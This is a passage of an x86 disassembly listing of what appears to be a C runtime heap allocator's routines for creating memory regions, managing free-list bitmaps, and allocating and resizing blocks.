  424fc9:	dec    BYTE PTR [eax+0x43]
  424fcc:	mov    eax,ds:0x45ffd8
  424fd1:	mov    ecx,DWORD PTR [eax+0x10]
  424fd4:	cmp    BYTE PTR [ecx+0x43],0x0
  424fd8:	jne    0x424fe3
  424fda:	and    DWORD PTR [eax+0x4],0xfffffffe
  424fde:	mov    eax,ds:0x45ffd8
  424fe3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424fe7:	jne    0x425052
  424fe9:	push   ebx
  424fea:	push   0x0
  424fec:	push   DWORD PTR [eax+0xc]
  424fef:	call   esi
  424ff1:	mov    eax,ds:0x45ffd8
  424ff6:	push   DWORD PTR [eax+0x10]
  424ff9:	push   0x0
  424ffb:	push   DWORD PTR ds:0x460220
  425001:	call   DWORD PTR ds:0x4280c0
  425007:	mov    eax,ds:0x45ffdc
  42500c:	mov    edx,DWORD PTR ds:0x45ffe0
  425012:	lea    eax,[eax+eax*4]
  425015:	shl    eax,0x2
  425018:	mov    ecx,eax
  42501a:	mov    eax,ds:0x45ffd8
  42501f:	sub    ecx,eax
  425021:	lea    ecx,[ecx+edx*1-0x14]
  425025:	push   ecx
  425026:	lea    ecx,[eax+0x14]
  425029:	push   ecx
  42502a:	push   eax
  42502b:	call   0x426880
  425030:	mov    eax,DWORD PTR [ebp+0x8]
  425033:	add    esp,0xc
  425036:	dec    DWORD PTR ds:0x45ffdc
  42503c:	cmp    eax,DWORD PTR ds:0x45ffd8
  425042:	jbe    0x425048
  425044:	sub    DWORD PTR [ebp+0x8],0x14
  425048:	mov    eax,ds:0x45ffe0
  42504d:	mov    ds:0x45ffe8,eax
  425052:	mov    eax,DWORD PTR [ebp+0x8]
  425055:	mov    ds:0x45ffd8,eax
  42505a:	mov    DWORD PTR ds:0x45fff0,edi
  425060:	pop    ebx
  425061:	pop    edi
  425062:	pop    esi
  425063:	leave  
  425064:	ret    
  425065:	mov    eax,ds:0x45ffdc
  42506a:	mov    ecx,DWORD PTR ds:0x45ffec
  425070:	push   edi
  425071:	xor    edi,edi
  425073:	cmp    eax,ecx
  425075:	jne    0x4250ab
  425077:	lea    eax,[ecx+ecx*4+0x50]
  42507b:	shl    eax,0x2
  42507e:	push   eax
  42507f:	push   DWORD PTR ds:0x45ffe0
  425085:	push   edi
  425086:	push   DWORD PTR ds:0x460220
  42508c:	call   DWORD PTR ds:0x4280e0
  425092:	cmp    eax,edi
  425094:	jne    0x42509a
  425096:	xor    eax,eax
  425098:	pop    edi
  425099:	ret    
  42509a:	add    DWORD PTR ds:0x45ffec,0x10
  4250a1:	mov    ds:0x45ffe0,eax
  4250a6:	mov    eax,ds:0x45ffdc
  4250ab:	mov    ecx,DWORD PTR ds:0x45ffe0
  4250b1:	push   esi
  4250b2:	push   0x41c4
  4250b7:	push   0x8
  4250b9:	push   DWORD PTR ds:0x460220
  4250bf:	lea    eax,[eax+eax*4]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	call   DWORD PTR ds:0x4280d8
  4250cb:	cmp    eax,edi
  4250cd:	mov    DWORD PTR [esi+0x10],eax
  4250d0:	jne    0x4250d6
  4250d2:	xor    eax,eax
  4250d4:	jmp    0x425119
  4250d6:	push   0x4
  4250d8:	push   0x2000
  4250dd:	push   0x100000
  4250e2:	push   edi
  4250e3:	call   DWORD PTR ds:0x42802c
  4250e9:	cmp    eax,edi
  4250eb:	mov    DWORD PTR [esi+0xc],eax
  4250ee:	jne    0x425102
  4250f0:	push   DWORD PTR [esi+0x10]
  4250f3:	push   edi
  4250f4:	push   DWORD PTR ds:0x460220
  4250fa:	call   DWORD PTR ds:0x4280c0
  425100:	jmp    0x4250d2
  425102:	or     DWORD PTR [esi+0x8],0xffffffff
  425106:	mov    DWORD PTR [esi],edi
  425108:	mov    DWORD PTR [esi+0x4],edi
  42510b:	inc    DWORD PTR ds:0x45ffdc
  425111:	mov    eax,DWORD PTR [esi+0x10]
  425114:	or     DWORD PTR [eax],0xffffffff
  425117:	mov    eax,esi
  425119:	pop    esi
  42511a:	pop    edi
  42511b:	ret    
  42511c:	push   ebp
  42511d:	mov    ebp,esp
  42511f:	push   ecx
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp+0x8]
  425124:	mov    eax,DWORD PTR [ecx+0x8]
  425127:	push   ebx
  425128:	push   esi
  425129:	mov    esi,DWORD PTR [ecx+0x10]
  42512c:	push   edi
  42512d:	xor    ebx,ebx
  42512f:	jmp    0x425134
  425131:	shl    eax,1
  425133:	inc    ebx
  425134:	test   eax,eax
  425136:	jge    0x425131
  425138:	mov    eax,ebx
  42513a:	imul   eax,eax,0x204
  425140:	lea    eax,[eax+esi*1+0x144]
  425147:	push   0x3f
  425149:	mov    DWORD PTR [ebp-0x8],eax
  42514c:	pop    edx
  42514d:	mov    DWORD PTR [eax+0x8],eax
  425150:	mov    DWORD PTR [eax+0x4],eax
  425153:	add    eax,0x8
  425156:	dec    edx
  425157:	jne    0x42514d
  425159:	push   0x4
  42515b:	mov    edi,ebx
  42515d:	push   0x1000
  425162:	shl    edi,0xf
  425165:	add    edi,DWORD PTR [ecx+0xc]
  425168:	push   0x8000
  42516d:	push   edi
  42516e:	call   DWORD PTR ds:0x42802c
  425174:	test   eax,eax
  425176:	jne    0x425180
  425178:	or     eax,0xffffffff
  42517b:	jmp    0x42521d
  425180:	lea    edx,[edi+0x7000]
  425186:	cmp    edi,edx
  425188:	mov    DWORD PTR [ebp-0x4],edx
  42518b:	ja     0x4251d0
  42518d:	mov    ecx,edx
  42518f:	sub    ecx,edi
  425191:	shr    ecx,0xc
  425194:	lea    eax,[edi+0x10]
  425197:	inc    ecx
  425198:	or     DWORD PTR [eax-0x8],0xffffffff
  42519c:	or     DWORD PTR [eax+0xfec],0xffffffff
  4251a3:	lea    edx,[eax+0xffc]
  4251a9:	mov    DWORD PTR [eax],edx
  4251ab:	lea    edx,[eax-0x1004]
  4251b1:	mov    DWORD PTR [eax-0x4],0xff0
  4251b8:	mov    DWORD PTR [eax+0x4],edx
  4251bb:	mov    DWORD PTR [eax+0xfe8],0xff0
  4251c5:	add    eax,0x1000
  4251ca:	dec    ecx
  4251cb:	jne    0x425198
  4251cd:	mov    edx,DWORD PTR [ebp-0x4]
  4251d0:	mov    eax,DWORD PTR [ebp-0x8]
  4251d3:	add    eax,0x1f8
  4251d8:	lea    ecx,[edi+0xc]
  4251db:	mov    DWORD PTR [eax+0x4],ecx
  4251de:	mov    DWORD PTR [ecx+0x8],eax
  4251e1:	lea    ecx,[edx+0xc]
  4251e4:	mov    DWORD PTR [eax+0x8],ecx
  4251e7:	mov    DWORD PTR [ecx+0x4],eax
  4251ea:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  4251ef:	xor    edi,edi
  4251f1:	inc    edi
  4251f2:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  4251f9:	mov    al,BYTE PTR [esi+0x43]
  4251fc:	mov    cl,al
  4251fe:	inc    cl
  425200:	test   al,al
  425202:	mov    eax,DWORD PTR [ebp+0x8]
  425205:	mov    BYTE PTR [esi+0x43],cl
  425208:	jne    0x42520d
  42520a:	or     DWORD PTR [eax+0x4],edi
  42520d:	mov    edx,0x80000000
  425212:	mov    ecx,ebx
  425214:	shr    edx,cl
  425216:	not    edx
  425218:	and    DWORD PTR [eax+0x8],edx
  42521b:	mov    eax,ebx
  42521d:	pop    edi
  42521e:	pop    esi
  42521f:	pop    ebx
  425220:	leave  
  425221:	ret    
  425222:	push   ebp
  425223:	mov    ebp,esp
  425225:	sub    esp,0xc
  425228:	mov    ecx,DWORD PTR [ebp+0x8]
  42522b:	mov    eax,DWORD PTR [ecx+0x10]
  42522e:	push   ebx
  42522f:	push   esi
  425230:	mov    esi,DWORD PTR [ebp+0x10]
  425233:	push   edi
  425234:	mov    edi,DWORD PTR [ebp+0xc]
  425237:	mov    edx,edi
  425239:	sub    edx,DWORD PTR [ecx+0xc]
  42523c:	add    esi,0x17
  42523f:	shr    edx,0xf
  425242:	mov    ecx,edx
  425244:	imul   ecx,ecx,0x204
  42524a:	lea    ecx,[ecx+eax*1+0x144]
  425251:	mov    DWORD PTR [ebp-0xc],ecx
  425254:	mov    ecx,DWORD PTR [edi-0x4]
  425257:	and    esi,0xfffffff0
  42525a:	dec    ecx
  42525b:	cmp    esi,ecx
  42525d:	lea    edi,[ecx+edi*1-0x4]
  425261:	mov    ebx,DWORD PTR [edi]
  425263:	mov    DWORD PTR [ebp+0x10],ecx
  425266:	mov    DWORD PTR [ebp-0x4],ebx
  425269:	jle    0x4253c4
  42526f:	test   bl,0x1
  425272:	jne    0x4253bd
  425278:	add    ebx,ecx
  42527a:	cmp    esi,ebx
  42527c:	jg     0x4253bd
  425282:	mov    ecx,DWORD PTR [ebp-0x4]
  425285:	sar    ecx,0x4
  425288:	dec    ecx
  425289:	cmp    ecx,0x3f
  42528c:	mov    DWORD PTR [ebp-0x8],ecx
  42528f:	jbe    0x425297
  425291:	push   0x3f
  425293:	pop    ecx
  425294:	mov    DWORD PTR [ebp-0x8],ecx
  425297:	mov    ebx,DWORD PTR [edi+0x4]
  42529a:	cmp    ebx,DWORD PTR [edi+0x8]
  42529d:	jne    0x4252e2
  42529f:	cmp    ecx,0x20
  4252a2:	mov    ebx,0x80000000
  4252a7:	jae    0x4252c3
  4252a9:	shr    ebx,cl
  4252ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4252ae:	lea    ecx,[ecx+eax*1+0x4]
  4252b2:	not    ebx
  4252b4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4252b8:	dec    BYTE PTR [ecx]
  4252ba:	jne    0x4252e2
  4252bc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252bf:	and    DWORD PTR [ecx],ebx
  4252c1:	jmp    0x4252e2
  4252c3:	add    ecx,0xffffffe0
  4252c6:	shr    ebx,cl
  4252c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4252cb:	lea    ecx,[ecx+eax*1+0x4]
  4252cf:	not    ebx
  4252d1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4252d8:	dec    BYTE PTR [ecx]
  4252da:	jne    0x4252e2
  4252dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4252df:	and    DWORD PTR [ecx+0x4],ebx
  4252e2:	mov    ecx,DWORD PTR [edi+0x8]
  4252e5:	mov    ebx,DWORD PTR [edi+0x4]
  4252e8:	mov    DWORD PTR [ecx+0x4],ebx
  4252eb:	mov    ecx,DWORD PTR [edi+0x4]
  4252ee:	mov    edi,DWORD PTR [edi+0x8]
  4252f1:	mov    DWORD PTR [ecx+0x8],edi
  4252f4:	mov    ecx,DWORD PTR [ebp+0x10]
  4252f7:	sub    ecx,esi
  4252f9:	add    DWORD PTR [ebp-0x4],ecx
  4252fc:	cmp    DWORD PTR [ebp-0x4],0x0
  425300:	jle    0x4253ab
  425306:	mov    edi,DWORD PTR [ebp-0x4]
  425309:	mov    ecx,DWORD PTR [ebp+0xc]
  42530c:	sar    edi,0x4
  42530f:	dec    edi
  425310:	cmp    edi,0x3f
  425313:	lea    ecx,[ecx+esi*1-0x4]
  425317:	jbe    0x42531c
  425319:	push   0x3f
  42531b:	pop    edi
  42531c:	mov    ebx,DWORD PTR [ebp-0xc]
  42531f:	lea    ebx,[ebx+edi*8]
  425322:	mov    DWORD PTR [ebp+0x10],ebx
  425325:	mov    ebx,DWORD PTR [ebx+0x4]
  425328:	mov    DWORD PTR [ecx+0x4],ebx
  42532b:	mov    ebx,DWORD PTR [ebp+0x10]
  42532e:	mov    DWORD PTR [ecx+0x8],ebx
  425331:	mov    DWORD PTR [ebx+0x4],ecx
  425334:	mov    ebx,DWORD PTR [ecx+0x4]
  425337:	mov    DWORD PTR [ebx+0x8],ecx
  42533a:	mov    ebx,DWORD PTR [ecx+0x4]
  42533d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425340:	jne    0x425399
  425342:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425346:	mov    BYTE PTR [ebp+0x13],cl
  425349:	inc    cl
  42534b:	cmp    edi,0x20
  42534e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425352:	jae    0x425370
  425354:	cmp    BYTE PTR [ebp+0x13],0x0
  425358:	jne    0x425368
  42535a:	mov    ecx,edi
  42535c:	mov    ebx,0x80000000
  425361:	shr    ebx,cl
  425363:	mov    ecx,DWORD PTR [ebp+0x8]
  425366:	or     DWORD PTR [ecx],ebx
  425368:	lea    eax,[eax+edx*4+0x44]
  42536c:	mov    ecx,edi
  42536e:	jmp    0x425390
  425370:	cmp    BYTE PTR [ebp+0x13],0x0
  425374:	jne    0x425386
  425376:	lea    ecx,[edi-0x20]
  425379:	mov    ebx,0x80000000
  42537e:	shr    ebx,cl
  425380:	mov    ecx,DWORD PTR [ebp+0x8]
  425383:	or     DWORD PTR [ecx+0x4],ebx
  425386:	lea    eax,[eax+edx*4+0xc4]
  42538d:	lea    ecx,[edi-0x20]
  425390:	mov    edx,0x80000000
  425395:	shr    edx,cl
  425397:	or     DWORD PTR [eax],edx
  425399:	mov    edx,DWORD PTR [ebp+0xc]
  42539c:	mov    ecx,DWORD PTR [ebp-0x4]
  42539f:	lea    eax,[edx+esi*1-0x4]
  4253a3:	mov    DWORD PTR [eax],ecx
  4253a5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4253a9:	jmp    0x4253ae
  4253ab:	mov    edx,DWORD PTR [ebp+0xc]
  4253ae:	lea    eax,[esi+0x1]
  4253b1:	mov    DWORD PTR [edx-0x4],eax
  4253b4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4253b8:	jmp    0x4254f9
  4253bd:	xor    eax,eax
  4253bf:	jmp    0x4254fc
  4253c4:	jge    0x4254f9
  4253ca:	mov    ebx,DWORD PTR [ebp+0xc]
  4253cd:	sub    DWORD PTR [ebp+0x10],esi
  4253d0:	lea    ecx,[esi+0x1]
  4253d3:	mov    DWORD PTR [ebx-0x4],ecx
  4253d6:	lea    ebx,[ebx+esi*1-0x4]
  4253da:	mov    esi,DWORD PTR [ebp+0x10]
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	mov    DWORD PTR [ebp+0xc],ebx
  4253e7:	mov    DWORD PTR [ebx-0x4],ecx
  4253ea:	jbe    0x4253ef
  4253ec:	push   0x3f
  4253ee:	pop    esi
  4253ef:	test   BYTE PTR [ebp-0x4],0x1
  4253f3:	jne    0x425479
  4253f9:	mov    esi,DWORD PTR [ebp-0x4]
  4253fc:	sar    esi,0x4
  4253ff:	dec    esi
  425400:	cmp    esi,0x3f
  425403:	jbe    0x425408
  425405:	push   0x3f
  425407:	pop    esi
  425408:	mov    ecx,DWORD PTR [edi+0x4]
  42540b:	cmp    ecx,DWORD PTR [edi+0x8]
  42540e:	jne    0x425452
  425410:	cmp    esi,0x20
  425413:	mov    ebx,0x80000000
  425418:	jae    0x425433
  42541a:	mov    ecx,esi
  42541c:	shr    ebx,cl
  42541e:	lea    esi,[esi+eax*1+0x4]
  425422:	not    ebx
  425424:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425428:	dec    BYTE PTR [esi]
  42542a:	jne    0x42544f
  42542c:	mov    ecx,DWORD PTR [ebp+0x8]
  42542f:	and    DWORD PTR [ecx],ebx
  425431:	jmp    0x42544f
  425433:	lea    ecx,[esi-0x20]
  425436:	shr    ebx,cl
  425438:	lea    ecx,[esi+eax*1+0x4]
  42543c:	not    ebx
  42543e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425445:	dec    BYTE PTR [ecx]
  425447:	jne    0x42544f
  425449:	mov    ecx,DWORD PTR [ebp+0x8]
  42544c:	and    DWORD PTR [ecx+0x4],ebx
  42544f:	mov    ebx,DWORD PTR [ebp+0xc]
  425452:	mov    ecx,DWORD PTR [edi+0x8]
  425455:	mov    esi,DWORD PTR [edi+0x4]
  425458:	mov    DWORD PTR [ecx+0x4],esi
  42545b:	mov    esi,DWORD PTR [edi+0x8]
  42545e:	mov    ecx,DWORD PTR [edi+0x4]
  425461:	mov    DWORD PTR [ecx+0x8],esi
  425464:	mov    esi,DWORD PTR [ebp+0x10]
  425467:	add    esi,DWORD PTR [ebp-0x4]
  42546a:	mov    DWORD PTR [ebp+0x10],esi
  42546d:	sar    esi,0x4
  425470:	dec    esi
  425471:	cmp    esi,0x3f
  425474:	jbe    0x425479
  425476:	push   0x3f
  425478:	pop    esi
  425479:	mov    ecx,DWORD PTR [ebp-0xc]
  42547c:	lea    ecx,[ecx+esi*8]
  42547f:	mov    edi,DWORD PTR [ecx+0x4]
  425482:	mov    DWORD PTR [ebx+0x8],ecx
  425485:	mov    DWORD PTR [ebx+0x4],edi
  425488:	mov    DWORD PTR [ecx+0x4],ebx
  42548b:	mov    ecx,DWORD PTR [ebx+0x4]
  42548e:	mov    DWORD PTR [ecx+0x8],ebx
  425491:	mov    ecx,DWORD PTR [ebx+0x4]
  425494:	cmp    ecx,DWORD PTR [ebx+0x8]
  425497:	jne    0x4254f0
  425499:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42549d:	mov    BYTE PTR [ebp+0xf],cl
  4254a0:	inc    cl
  4254a2:	cmp    esi,0x20
  4254a5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4254a9:	jae    0x4254c7
  4254ab:	cmp    BYTE PTR [ebp+0xf],0x0
  4254af:	jne    0x4254bf
  4254b1:	mov    ecx,esi
  4254b3:	mov    edi,0x80000000
  4254b8:	shr    edi,cl
  4254ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4254bd:	or     DWORD PTR [ecx],edi
  4254bf:	lea    eax,[eax+edx*4+0x44]
  4254c3:	mov    ecx,esi
  4254c5:	jmp    0x4254e7
  4254c7:	cmp    BYTE PTR [ebp+0xf],0x0
  4254cb:	jne    0x4254dd
  4254cd:	lea    ecx,[esi-0x20]
  4254d0:	mov    edi,0x80000000
  4254d5:	shr    edi,cl
  4254d7:	mov    ecx,DWORD PTR [ebp+0x8]
  4254da:	or     DWORD PTR [ecx+0x4],edi
  4254dd:	lea    eax,[eax+edx*4+0xc4]
  4254e4:	lea    ecx,[esi-0x20]
  4254e7:	mov    edx,0x80000000
  4254ec:	shr    edx,cl
  4254ee:	or     DWORD PTR [eax],edx
  4254f0:	mov    eax,DWORD PTR [ebp+0x10]
  4254f3:	mov    DWORD PTR [ebx],eax
  4254f5:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  4254f9:	xor    eax,eax
  4254fb:	inc    eax
  4254fc:	pop    edi
  4254fd:	pop    esi
  4254fe:	pop    ebx
  4254ff:	leave  
  425500:	ret    
  425501:	push   ebp
  425502:	mov    ebp,esp
  425504:	sub    esp,0x14
  425507:	mov    ecx,DWORD PTR [ebp+0x8]
  42550a:	mov    eax,ds:0x45ffdc
  42550f:	mov    edx,DWORD PTR ds:0x45ffe0
  425515:	add    ecx,0x17
  425518:	and    ecx,0xfffffff0
  42551b:	push   ebx
  42551c:	mov    DWORD PTR [ebp-0x10],ecx
  42551f:	sar    ecx,0x4
  425522:	push   esi
  425523:	lea    eax,[eax+eax*4]
  425526:	push   edi
  425527:	dec    ecx
  425528:	cmp    ecx,0x20
  42552b:	lea    edi,[edx+eax*4]
  42552e:	mov    DWORD PTR [ebp-0x4],edi
  425531:	jge    0x42553e
  425533:	or     esi,0xffffffff
  425536:	shr    esi,cl
  425538:	or     DWORD PTR [ebp-0x8],0xffffffff
  42553c:	jmp    0x42554b
  42553e:	add    ecx,0xffffffe0
  425541:	or     eax,0xffffffff
  425544:	xor    esi,esi
  425546:	shr    eax,cl
  425548:	mov    DWORD PTR [ebp-0x8],eax
  42554b:	mov    eax,ds:0x45ffe8
  425550:	mov    ebx,eax
  425552:	mov    DWORD PTR [ebp-0xc],esi
  425555:	cmp    ebx,edi
  425557:	jmp    0x42556d
  425559:	mov    ecx,DWORD PTR [ebx+0x4]
  42555c:	mov    edi,DWORD PTR [ebx]
  42555e:	and    ecx,DWORD PTR [ebp-0x8]
  425561:	and    edi,esi
  425563:	or     ecx,edi
  425565:	jne    0x425572
  425567:	add    ebx,0x14
  42556a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42556d:	mov    DWORD PTR [ebp+0x8],ebx
  425570:	jb     0x425559
  425572:	cmp    ebx,DWORD PTR [ebp-0x4]
  425575:	jne    0x42559b
  425577:	mov    ebx,edx
  425579:	jmp    0x42558c
  42557b:	mov    ecx,DWORD PTR [ebx+0x4]
  42557e:	mov    edi,DWORD PTR [ebx]
  425580:	and    ecx,DWORD PTR [ebp-0x8]
  425583:	and    edi,esi
  425585:	or     ecx,edi
  425587:	jne    0x425593
  425589:	add    ebx,0x14
  42558c:	cmp    ebx,eax
  42558e:	mov    DWORD PTR [ebp+0x8],ebx
  425591:	jb     0x42557b
  425593:	cmp    ebx,eax
  425595:	je     0x42562f
  42559b:	mov    DWORD PTR ds:0x45ffe8,ebx
  4255a1:	mov    eax,DWORD PTR [ebx+0x10]
  4255a4:	mov    edx,DWORD PTR [eax]
  4255a6:	cmp    edx,0xffffffff
  4255a9:	mov    DWORD PTR [ebp-0x4],edx
  4255ac:	je     0x4255c2
  4255ae:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4255b5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4255b9:	and    ecx,DWORD PTR [ebp-0x8]
  4255bc:	and    edi,esi
  4255be:	or     ecx,edi
  4255c0:	jne    0x4255f8
  4255c2:	mov    edx,DWORD PTR [eax+0xc4]
  4255c8:	and    edx,DWORD PTR [ebp-0x8]
  4255cb:	and    DWORD PTR [ebp-0x4],0x0
  4255cf:	lea    ecx,[eax+0x44]
  4255d2:	mov    esi,DWORD PTR [ecx]
  4255d4:	and    esi,DWORD PTR [ebp-0xc]
  4255d7:	or     edx,esi
  4255d9:	mov    esi,DWORD PTR [ebp-0xc]
  4255dc:	jne    0x4255f5
  4255de:	mov    edx,DWORD PTR [ecx+0x84]
  4255e4:	and    edx,DWORD PTR [ebp-0x8]
  4255e7:	inc    DWORD PTR [ebp-0x4]
  4255ea:	add    ecx,0x4
  4255ed:	mov    edi,DWORD PTR [ecx]
  4255ef:	and    edi,esi
  4255f1:	or     edx,edi
  4255f3:	je     0x4255de
  4255f5:	mov    edx,DWORD PTR [ebp-0x4]
  4255f8:	mov    ecx,edx
  4255fa:	imul   ecx,ecx,0x204
  425600:	lea    ecx,[ecx+eax*1+0x144]
  425607:	mov    DWORD PTR [ebp-0xc],ecx
  42560a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42560e:	xor    edi,edi
  425610:	and    ecx,esi
  425612:	jne    0x425681
  425614:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42561b:	and    ecx,DWORD PTR [ebp-0x8]
  42561e:	push   0x20
  425620:	pop    edi
  425621:	jmp    0x425681
  425623:	cmp    DWORD PTR [ebx+0x8],0x0
  425627:	jne    0x425634
  425629:	add    ebx,0x14
  42562c:	mov    DWORD PTR [ebp+0x8],ebx
  42562f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425632:	jb     0x425623
  425634:	cmp    ebx,DWORD PTR [ebp-0x4]
  425637:	jne    0x42565f
  425639:	mov    ebx,edx
  42563b:	jmp    0x425646
  42563d:	cmp    DWORD PTR [ebx+0x8],0x0
  425641:	jne    0x42564d
  425643:	add    ebx,0x14
  425646:	cmp    ebx,eax
  425648:	mov    DWORD PTR [ebp+0x8],ebx
  42564b:	jb     0x42563d
  42564d:	cmp    ebx,eax
  42564f:	jne    0x42565f
  425651:	call   0x425065
  425656:	mov    ebx,eax
  425658:	test   ebx,ebx
  42565a:	mov    DWORD PTR [ebp+0x8],ebx
  42565d:	je     0x425677
  42565f:	push   ebx
  425660:	call   0x42511c
  425665:	pop    ecx
  425666:	mov    ecx,DWORD PTR [ebx+0x10]
  425669:	mov    DWORD PTR [ecx],eax
  42566b:	mov    eax,DWORD PTR [ebx+0x10]
  42566e:	cmp    DWORD PTR [eax],0xffffffff
  425671:	jne    0x42559b
  425677:	xor    eax,eax
  425679:	jmp    0x4257f8
  42567e:	shl    ecx,1
  425680:	inc    edi
  425681:	test   ecx,ecx
  425683:	jge    0x42567e
  425685:	mov    ecx,DWORD PTR [ebp-0xc]
  425688:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42568c:	mov    ecx,DWORD PTR [edx]
  42568e:	sub    ecx,DWORD PTR [ebp-0x10]
  425691:	mov    esi,ecx
  425693:	sar    esi,0x4
  425696:	dec    esi
  425697:	cmp    esi,0x3f
  42569a:	mov    DWORD PTR [ebp-0x8],ecx
  42569d:	jle    0x4256a2
  42569f:	push   0x3f
  4256a1:	pop    esi
  4256a2:	cmp    esi,edi
  4256a4:	je     0x4257ab
  4256aa:	mov    ecx,DWORD PTR [edx+0x4]
  4256ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b0:	jne    0x42570e
  4256b2:	cmp    edi,0x20
  4256b5:	mov    ebx,0x80000000
  4256ba:	jge    0x4256e2
  4256bc:	mov    ecx,edi
  4256be:	shr    ebx,cl
  4256c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4256c3:	lea    edi,[eax+edi*1+0x4]
  4256c7:	not    ebx
  4256c9:	mov    DWORD PTR [ebp-0x14],ebx
  4256cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4256d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4256d4:	dec    BYTE PTR [edi]
  4256d6:	jne    0x42570b
  4256d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4256db:	mov    ebx,DWORD PTR [ebp+0x8]
  4256de:	and    DWORD PTR [ebx],ecx
  4256e0:	jmp    0x42570e
  4256e2:	lea    ecx,[edi-0x20]
  4256e5:	shr    ebx,cl
  4256e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4256ea:	lea    ecx,[eax+ecx*4+0xc4]
  4256f1:	lea    edi,[eax+edi*1+0x4]
  4256f5:	not    ebx
  4256f7:	and    DWORD PTR [ecx],ebx
  4256f9:	dec    BYTE PTR [edi]
  4256fb:	mov    DWORD PTR [ebp-0x14],ebx
  4256fe:	jne    0x42570b
  425700:	mov    ebx,DWORD PTR [ebp+0x8]
  425703:	mov    ecx,DWORD PTR [ebp-0x14]
  425706:	and    DWORD PTR [ebx+0x4],ecx
  425709:	jmp    0x42570e
  42570b:	mov    ebx,DWORD PTR [ebp+0x8]
  42570e:	cmp    DWORD PTR [ebp-0x8],0x0
  425712:	mov    ecx,DWORD PTR [edx+0x8]
  425715:	mov    edi,DWORD PTR [edx+0x4]
  425718:	mov    DWORD PTR [ecx+0x4],edi
  42571b:	mov    ecx,DWORD PTR [edx+0x4]
  42571e:	mov    edi,DWORD PTR [edx+0x8]
  425721:	mov    DWORD PTR [ecx+0x8],edi
  425724:	je     0x4257b7
  42572a:	mov    ecx,DWORD PTR [ebp-0xc]
  42572d:	lea    ecx,[ecx+esi*8]
  425730:	mov    edi,DWORD PTR [ecx+0x4]
  425733:	mov    DWORD PTR [edx+0x8],ecx
  425736:	mov    DWORD PTR [edx+0x4],edi
  425739:	mov    DWORD PTR [ecx+0x4],edx
  42573c:	mov    ecx,DWORD PTR [edx+0x4]
  42573f:	mov    DWORD PTR [ecx+0x8],edx
  425742:	mov    ecx,DWORD PTR [edx+0x4]
  425745:	cmp    ecx,DWORD PTR [edx+0x8]
  425748:	jne    0x4257a8
  42574a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42574e:	mov    BYTE PTR [ebp+0xb],cl
  425751:	inc    cl
  425753:	cmp    esi,0x20
  425756:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42575a:	jge    0x42577f
  42575c:	cmp    BYTE PTR [ebp+0xb],0x0
  425760:	jne    0x42576d
  425762:	mov    edi,0x80000000
  425767:	mov    ecx,esi
  425769:	shr    edi,cl
  42576b:	or     DWORD PTR [ebx],edi
  42576d:	mov    ecx,esi
  42576f:	mov    edi,0x80000000
  425774:	shr    edi,cl
  425776:	mov    ecx,DWORD PTR [ebp-0x4]
  425779:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42577d:	jmp    0x4257a8
  42577f:	cmp    BYTE PTR [ebp+0xb],0x0
  425783:	jne    0x425792
  425785:	lea    ecx,[esi-0x20]
  425788:	mov    edi,0x80000000
  42578d:	shr    edi,cl
  42578f:	or     DWORD PTR [ebx+0x4],edi
  425792:	mov    ecx,DWORD PTR [ebp-0x4]
  425795:	lea    edi,[eax+ecx*4+0xc4]
  42579c:	lea    ecx,[esi-0x20]
  42579f:	mov    esi,0x80000000
  4257a4:	shr    esi,cl
  4257a6:	or     DWORD PTR [edi],esi
  4257a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ab:	test   ecx,ecx
  4257ad:	je     0x4257ba
  4257af:	mov    DWORD PTR [edx],ecx
  4257b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4257b5:	jmp    0x4257ba
  4257b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4257ba:	mov    esi,DWORD PTR [ebp-0x10]
  4257bd:	add    edx,ecx
  4257bf:	lea    ecx,[esi+0x1]
  4257c2:	mov    DWORD PTR [edx],ecx
  4257c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4257c8:	mov    esi,DWORD PTR [ebp-0xc]
  4257cb:	mov    ecx,DWORD PTR [esi]
  4257cd:	test   ecx,ecx
  4257cf:	lea    edi,[ecx+0x1]
  4257d2:	mov    DWORD PTR [esi],edi
  4257d4:	jne    0x4257f0
  4257d6:	cmp    ebx,DWORD PTR ds:0x45ffd8
  4257dc:	jne    0x4257f0
  4257de:	mov    ecx,DWORD PTR [ebp-0x4]
